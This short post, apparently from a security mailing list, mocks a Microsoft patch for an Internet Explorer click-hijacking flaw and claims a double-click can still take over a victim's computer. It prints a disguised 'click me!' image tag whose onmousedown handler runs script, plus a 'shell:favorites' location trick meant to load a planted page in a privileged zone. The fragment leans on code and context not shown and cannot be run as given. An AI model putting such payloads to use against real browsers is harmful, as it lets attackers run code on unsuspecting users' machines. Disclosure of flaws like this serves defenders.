Microsoft just disabled those functions from
being called when the mouse button is down and called it 
patched. No more hijackclick,
right?

Wrong.

This is absolutely fantastic Paul, with a patented double-click 
of the mouse we can remotely take over the target's computer:

Just substitute as follows:

1. <img src="greyhat.html" id=anch 
onmousedown="parent.nsc.style.width=2000;parent.nsc.style.height=
2000;parent.pop.show(1,1,1,1);parent.setTimeout('showalert
()',3000);" style="width=168px;height=152px;background-image:url
('youlickit.gif');cursor:hand" title="click me!"></a>

2. location="shell:favorites\\greyhat[1].htm"

Someone was querying the other day whether shell in Internet 
Explorer poses a problem [despite repeated demonstrations]. 
Pah ! Probably not.
